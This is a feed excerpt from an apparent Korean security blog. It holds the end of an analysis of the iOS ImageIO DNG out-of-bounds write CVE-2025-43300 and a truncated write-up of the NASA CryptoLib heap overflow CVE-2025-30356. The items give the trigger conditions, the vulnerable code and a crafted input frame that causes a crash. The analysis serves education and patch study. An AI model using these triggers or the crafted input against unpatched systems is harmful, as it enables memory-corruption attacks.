alt="image.png"></p><p>&#xBCF4;&#xD1B5;&#xC758; DNG &#xD30C;&#xC77C;&#xB85C;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBA54;&#xD0C0; &#xD0DC;&#xADF8;(SamplesPerPixel) &#xC870;&#xC815; &#xB4F1;&#xC73C;&#xB85C; &#xADF8; &#xAC80;&#xC99D; &#xAD6C;&#xAC04;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xBA74;, &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC81C; &#xD578;&#xB4DC;&#xD3F0;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;&#xB97C; &#xC704;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC548;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; (= &#xC6A9;&#xB7C9;&#xC5C6;&#xC74C;) </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image17.png" alt="image.png"></p><p>&#xC81C; &#xBC84;&#xC804;&#xC740; 18.1.1 &#xC785;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image18.png" alt="image.png"></p><p>&#xC6B0;&#xC120; DNG &#xD30C;&#xC77C;&#xC744; &#xC5F4; DNGViewer&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> SwiftUI<span class="hljs-keyword">import</span> UniformTypeIdentifiers<span class="hljs-keyword">import</span> Combine<span class="hljs-keyword">import</span> UIKit<span class="hljs-keyword">import</span> CoreImage<span class="hljs-keyword">import</span> CoreImage.CIFilterBuiltins@main<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNGViewerApp</span>:</span> App {    var body: some Scene {        WindowGroup {            ContentView()        }    }}<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RawRenderer</span>:</span> ObservableObject {    <span class="hljs-keyword">private</span> let context = CIContext(options: [        .cacheIntermediates: <span class="hljs-literal">false</span>    ])    @Published var image: UIImage?    @Published var <span class="hljs-built_in">log</span>: String = <span class="hljs-string">&quot;&quot;</span>    func render(from url: URL) {        <span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;Loading: \(url.lastPathComponent)\n&quot;</span>                guard let raw = CIRAWFilter(imageURL: url, options: [:]) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;CIRAWFilter unavailable or failed to open URL\n&quot;</span>            <span class="hljs-keyword">return</span>        }          guard let ciImage = raw.value(forKey: kCIOutputImageKey) as? CIImage <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to get CIImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        let extent = ciImage.extent.integral        guard let cg = context.createCGImage(ciImage, from: extent) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to create CGImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        image = UIImage(cgImage: cg)        <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Rendered: \(Int(extent.width))&#xD7;\(Int(extent.height))\n&quot;</span>    }}struct ContentView: View {    @StateObject var renderer = RawRenderer()    @State <span class="hljs-keyword">private</span> var showPicker = <span class="hljs-literal">false</span>    var body: some View {        VStack(spacing: <span class="hljs-number">12</span>) {            <span class="hljs-keyword">if</span> let img = renderer.image {                Image(uiImage: img)                    .resizable()                    .scaledToFit()                    .background(Color.black.opacity(<span class="hljs-number">0.05</span>))                    .cornerRadius(<span class="hljs-number">12</span>)                    .padding(.horizontal)            } <span class="hljs-keyword">else</span> {                Text(<span class="hljs-string">&quot;Open a DNG&quot;</span>).foregroundColor(.secondary)                    .padding(.top, <span class="hljs-number">40</span>)            }            HStack {                Button(<span class="hljs-string">&quot;Open DNG&quot;</span>) { showPicker = <span class="hljs-literal">true</span> }                .buttonStyle(.borderedProminent)                Button(<span class="hljs-string">&quot;Clear&quot;</span>) { renderer.image = nil; renderer.<span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;&quot;</span> }                .buttonStyle(.bordered)            }            ScrollView {                Text(renderer.<span class="hljs-built_in">log</span>)                    .font(.system(.caption, design: .monospaced))                    .frame(maxWidth: .infinity, alignment: .leading)                    .padding()                    .background(Color.black.opacity(<span class="hljs-number">0.03</span>))                    .cornerRadius(<span class="hljs-number">8</span>)            }            .frame(maxHeight: <span class="hljs-number">160</span>)            .padding(.horizontal)        }        .sheet(isPresented: $showPicker) {            DocumentPicker { url in                <span class="hljs-keyword">if</span> let url { renderer.render(from: url) }            }        }    }}struct DocumentPicker: UIViewControllerRepresentable {    var onPick: (URL?) -&gt; Void    func makeCoordinator() -&gt; Coordinator { Coordinator(onPick: onPick) }    func makeUIViewController(context: Context) -&gt; UIDocumentPickerViewController {        <span class="hljs-comment">// DNG UTI&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &quot;com.adobe.raw-image&quot;.</span>        <span class="hljs-comment">// iOS 14+&#xC5D0;&#xC120; UTType.image(&#xB610;&#xB294; item)&#xB85C; &#xC5F4;&#xC5B4;&#xB3C4; &#xBB34;&#xBC29;.</span>        let vc = UIDocumentPickerViewController(forOpeningContentTypes: [            UTType(importedAs: <span class="hljs-string">&quot;com.adobe.raw-image&quot;</span>), <span class="hljs-comment">// DNG</span>            .image, .item        ])        vc.allowsMultipleSelection = <span class="hljs-literal">false</span>        vc.delegate = context.coordinator        <span class="hljs-keyword">return</span> vc    }    func updateUIViewController(_ uiViewController: UIDocumentPickerViewController, context: Context) {}    <span class="hljs-keyword">final</span> class Coordinator: NSObject, UIDocumentPickerDelegate {        let onPick: (URL?) -&gt; Void        init(onPick: @escaping (URL?) -&gt; Void) { self.onPick = onPick }        func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {            onPick(urls.first)        }        func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) { onPick(nil) }    }}</code></pre><p><img src="/2025/10/23/clalxk/imageIO_ko/image19.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image21.png" alt="image.png"></p><p><a href="https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346">https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346</a></p><p>&#xC0AC;&#xC6A9;&#xD55C; &#xC774;&#xBBF8;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xBDF0;&#xC5B4;&#xB85C; poc dng &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xBA74;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CLosslessJpegUnpacker: <code>0x1DD902E78</code></li><li>CDNGLosslessJpegUnpacker: <code>0x1DD95DE88</code></li><li>CDNGLosslessJpegUnpacker::unpackTile: <code>0x1DD95B198</code></li><li>CLosslessJpegRestartUnpacker: <code>0x1DD95F784</code></li></ul><p><strong>&#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;</strong>: SOF3(&#xBB34;&#xC190;&#xC2E4;), DHT &#xC874;&#xC7AC;, SOS &#xC720;&#xD6A8;, <strong>BitsPerSample=16</strong>, <strong>SamplesPerPixel=2</strong>, <strong>NumComponents=1</strong></p><p>&#x2018;&#xD53D;&#xC140; &#xB8E8;&#xD504; &#xC870;&#xAC74;&#x2019;&#xC740; <strong>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xAC1C;&#xC218;(1)</strong> &#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC7A1;&#xC544;&#xB193;&#xACE0;, &#xB8E8;&#xD504; &#xB0B4;&#xBD80;&#xC758; &#xC99D;&#xAC00;/&#xC4F0;&#xAE30;&#xB294; <strong>&#xC0D8;&#xD50C; &#xC218;(2)</strong> &#xB97C; &#xAC00;&#xC815;&#xD574; <strong>16&#xBE44;&#xD2B8; &#xD7; 2&#xCC44;&#xB110;</strong>&#xC744; &#xAE30;&#xB85D;&#xD568; &#x2192; &#xD55C; &#xD589;(row)&#xB9C8;&#xB2E4; <strong>&#xC608;&#xC0C1;&#xC758; 2&#xBC30;</strong>&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xC5EC; <strong>OOB Write</strong>&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xB3D9;&#xC791;&#xB4E4;&#xC744; &#xB530;&#xB77C;&#xAC00; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image20.png" alt="image.png"></p><ul><li><strong>&#xB9C8;&#xCEE4; &#xD30C;&#xC2F1;</strong>: SOF3(0xFFC0), DHT(0xFFC4), SOS(0xFFDA) &#xD655;&#xC778; &#xBC0F; Huffman &#xD14C;&#xC774;&#xBE14;</li><li><strong>&#xBC84;&#xD37C; &#xACC4;&#xC0B0;/&#xD560;&#xB2F9;</strong>: &#xB300;&#xB7B5; width &#xD7; height &#xD7; SamplesPerPixel(=2) &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD655;&#xBCF4;</li><li><p><strong>1&#xD53D;&#xC140; &#xB514;&#xCF54;&#xB4DC; &#xD6C4; &#xD589; &#xB2E8;&#xC704; &#xB8E8;&#xD504;</strong></p><ul><li>&#xC0AC;&#xC2E4;&#xC0C1; &#x2018;<strong>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xC218; &#x2265; 2&#x2019;</strong></li><li><strong>NumComponents=1</strong>, <strong>SamplesPerPixel=2</strong> &#xC870;&#xD569;</li><li><p>&#xB8E8;&#xD504;&#xC758; &#xC885;&#xB8CC; &#xC870;&#xAC74;&#xC740; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;=1&#xC5D0; &#xB9DE;&#xCDB0;&#xC838; &#xC788;&#xC9C0;&#xB9CC;, &#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC740; &#xD53D;&#xC140;&#xB9C8;&#xB2E4; 16&#xBE44;&#xD2B8; &#xAC12; &#xB450; &#xAC1C;&#xB97C; &#xC4F0;&#xACE0; &#xD3EC;&#xC778;&#xD130;&#xB97C; 2&#xC0D8;&#xD50C;&#xC529; &#xC774;&#xB3D9;</p><p>&#x2192; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xD589;&#xC5D0;&#xC11C; <strong>2&#xBC30; &#xCD08;&#xACFC; &#xAE30;&#xB85D;</strong> &#x2192; &#xD589; &#xB05D;&#xC744; &#xB118;&#xC5B4; <strong>OOB Write &#xAC00;&#xB2A5;</strong></p></li></ul></li></ul><p>(<code>0x1DD95B198</code> &#x2192; <code>0x1DD95B6C4</code> &#x2192; <code>0x1DD95B8DC</code> ~ <code>0x1DD95B944</code> &#x2192; <code>0x1DD95BCCC</code>  &#xC774;&#xB807;&#xAC8C; &#xB530;&#xB77C;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. )</p><h3 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h3><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;, CVE-2025-43300&#xC740; <strong>SamplesPerPixel=2 &#x2194; SOF3 NumComponents=1</strong> &#xBD88;&#xC77C;&#xCE58;&#xB85C; &#xC881;&#xAC8C; &#xC7A1;&#xD78C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; <strong>16bpp&#xD7;2&#xCC44;&#xB110;</strong>&#xC744; &#xD589;&#xB9C8;&#xB2E4; &#xC368; &#xBC84;&#xB824; stride&#xB97C; &#xB118;&#xC5B4;&#xAC00;&#xB294; <strong>OOB Write</strong>&#xAC00; &#xD130;&#xC9C0;&#xB294; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; dyld &#xCE90;&#xC2DC; diff&#xC640; vtable &#xD0C0;&#xC785;&#xD654;&#xB97C; &#xD1B5;&#xD574; <strong>CDNGLosslessJpegUnpacker &#x2192; &#xD0C0;&#xC77C; &#xC5B8;&#xD328;&#xCEE4; &#xACBD;&#xB85C;</strong>&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xC2E4;&#xC81C; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74; &#xBC0F; &#xD328;&#xD134;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>iOS 18.6.2&#xC5D0;&#xC11C;&#xB294; <strong>CMPhoto+CVPixelBuffer</strong> &#xC804;&#xD658;&#xACFC; <strong>DataSize/stride &#xAC80;&#xC99D;</strong>&#xC744; &#xCD94;&#xAC00;&#xD574; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB97C; &#xCC28;&#xB2E8;&#xD588;&#xC73C;&#xB2C8;, &#xC2E4;&#xC0AC;&#xC6A9; &#xAE30;&#xAE30;&#xB294; 18.6.2 &#xC774;&#xC0C1; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;! &#xC800;&#xB3C4; &#xC774;&#xC820;.. &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB824;&#xACE0;&#xC694; &#x314B;&#x314B;.. </p><p>&#xC624;&#xB298; &#xC0B4;&#xD3B4;&#xBCF8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2E4;&#xC81C;&#xB85C; &#xC545;&#xC6A9;&#xB418;&#xC5B4; &#xC774;&#xC288;&#xAC00; &#xC788;&#xC5C8;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xB294;&#xB370;&#xC694;. iOS&#xB97C; &#xCC98;&#xC74C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBD10;&#xC11C; &#xB2E4;&#xC18C; &#xC5B4;&#xB824;&#xC6E0;&#xC9C0;&#xB9CC; &#xB098;&#xB984;&#xB300;&#xB85C; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xACFC;&#xC815;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC5F4;&#xC2EC;&#xD788; &#xACF5;&#xBD80;&#xD574;&#xBCFC;&#xAC8C;&#xC694;~! </p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md">https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md</a></p><p><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p><a href="https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300">https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300</a></p><p><a href="https://github.com/msuiche/elegant-bouncer">https://github.com/msuiche/elegant-bouncer</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-43300/">CVE-2025-43300</category>
      
      <category domain="https://hackyboiz.github.io/tags/ImageIO/">ImageIO</category>
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-30356: NASA CryptoLib의 길이 검증 미흡으로 인한 Heap Buffer Overflow</title>
      <link>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/</link>
      <guid>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/</guid>
      <pubDate>Wed, 22 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; NASA SW &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC9C0;&#xB09C; NASA SW &#xCDE8;&#xC57D;&#xC810;</p><blockquote><p><a href="https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-54878: NASA CryptoLib&#xC758; Heap Buffer Overflow&#xB85C; &#xC778;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS)</a><br><a href="https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2024-55030 : NASA fPrime&#xC758; Queue Overflow&#xB85C; &#xC778;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;</a><br><a href="https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-25372: cFS &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC; &#xBAA8;&#xB4C8;&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xCDE8;&#xC57D;&#xC810;</a><br><a href="https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-30216: CryptoLib&#xC758; Heap Buffer Overflow &#xCDE8;&#xC57D;&#xC810;</a></p></blockquote><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2">https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NASA CryptoLib &#x2264; 1.3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="0-&#xCDE8;&#xC57D;&#xC810;-&#xBC30;&#xACBD;"><a href="#0-&#xCDE8;&#xC57D;&#xC810;-&#xBC30;&#xACBD;" class="headerlink" title="0. &#xCDE8;&#xC57D;&#xC810; &#xBC30;&#xACBD;"></a>0. &#xCDE8;&#xC57D;&#xC810; &#xBC30;&#xACBD;</h3><p>NASA CryptoLib&#xC740; cFS(core Flight System)&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD574; CCSDS(Consultative Committee for Space Data Systems) Space Data Link Security Protocol - Extended Procedures (SDLS-EP)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; &#xC194;&#xB8E8;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; &#xD154;&#xB808;&#xCEE4;&#xB9E8;&#xB4DC; &#xD504;&#xB808;&#xC784; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC5D0; Heap Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h3 id="1-Root-Cause-&#xC124;&#xBA85;"><a href="#1-Root-Cause-&#xC124;&#xBA85;" class="headerlink" title="1. Root Cause &#xC124;&#xBA85;"></a>1. Root Cause &#xC124;&#xBA85;</h3><p><code>Crypto_TC_ApplySecurity</code> &#xD568;&#xC218;&#xB294; &#xC554;&#xD638;&#xD654; &#xBC0F; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xBA70;, &#xD1B5;&#xC2E0; &#xD504;&#xB808;&#xC784;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548; &#xCC98;&#xB9AC;&#xB97C; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD504;&#xB808;&#xC784;&#xC758; &#xD5E4;&#xB354;&#xC640; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xACE0;, &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>Crypto_TC_ApplySecurity_Cam()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC758; &#xBCF4;&#xC548; &#xAD8C;&#xACE0;&#xC5D0;&#xC11C; <code>fl</code> &#xD544;&#xB4DC;&#xC758; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD588;&#xC9C0;&#xB9CC;, &#xD328;&#xCE58; &#xCF54;&#xB4DC;&#xAC00; &#xBD88;&#xC644;&#xC804;&#xD558;&#xC5EC; &#xC5EC;&#xC804;&#xD788; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACC4;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xBB38;&#xC81C; &#xCF54;&#xB4DC;:</strong></p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (temp_tc_header.fl &lt;= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>){    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;    mc_if-&gt;mc_log(status);    <span class="hljs-keyword">return</span> status;} <span class="hljs-keyword">uint16_t</span> tf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>;<span class="hljs-built_in">memcpy</span>((p_new_enc_frame + index), (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len), tf_payload_len);</code></pre><p>&#xD604;&#xC7AC;&#xC758; &#xD328;&#xCE58; &#xCF54;&#xB4DC;&#xB294; <code>fl</code>&#xC774; &#xD2B9;&#xC815; &#xC0C1;&#xC218;&#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xAC70;&#xB098; &#xAC19;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; <code>tf_payload_len</code> &#xACC4;&#xC0B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xC644;&#xC804;&#xD788; &#xB9C9;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>fl</code>&#xC744; <code>6</code>, <code>segment_hdr_len</code>&#xC744; <code>1</code>, <code>fecf_len</code>&#xC744; <code>2</code>&#xB85C; &#xC870;&#xC791;&#xD558;&#xBA74;, <code>tf_payload_len</code> &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB294; <code>-1</code>&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; <code>uint16_t</code> &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xB418;&#xBA74;&#xC11C; <code>65535</code>&#xC640; &#xAC19;&#xC740; &#xB9E4;&#xC6B0; &#xD070; &#xC591;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xD658;(integer wrap-around)&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, <code>memcpy()</code> &#xD568;&#xC218;&#xB294; <code>tf_payload_len</code>&#xC774; <code>65535</code>&#xB77C;&#xB294; &#xAC70;&#xB300;&#xD55C; &#xAC12;&#xC744; &#xAC16;&#xAC8C; &#xB418;&#xBBC0;&#xB85C;, &#xD560;&#xB2F9;&#xB41C; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xD6E8;&#xC52C; &#xCD08;&#xACFC;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC774; &#xC190;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-PoC-&#xC124;&#xBA85;"><a href="#2-PoC-&#xC124;&#xBA85;" class="headerlink" title="2. PoC &#xC124;&#xBA85;"></a>2. PoC &#xC124;&#xBA85;</h3><p>ASan(AddressSanitizer)&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC870;&#xC791;&#xB41C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xC785;&#xB825; &#xD504;&#xB808;&#xC784;&#xC744; <code>Crypto_TC_ApplySecurity()</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74;, &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xCDA9;&#xB3CC;&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xC791;&#xB41C; &#xC785;&#xB825; &#xD504;&#xB808;&#xC784;:</p><pre><code class="hljs jsx"><span class="hljs-number">20</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">19</span> <span class="hljs-number">31</span> FA <span class="hljs-number">2</span>A <span class="hljs-number">79</span> <span class="hljs-number">20</span> <span class="hljs-number">6</span>F <span class="hljs-number">7</span>F <span class="hljs-number">0</span>D AD <span class="hljs-number">55</span> CE <span class="hljs-number">54</span> <span class="hljs-number">89</span> <span class="hljs-number">9</span>D D3 <span class="hljs-number">7</span>F A6 D0 <span class="hljs-number">07</span> B4 E8 <span class="hljs-number">6</span>D B4 E8 <span class="hljs-number">6</span>D A4 B4 E8 <span class="hljs-number">67</span></code></pre><p>&#xC774; 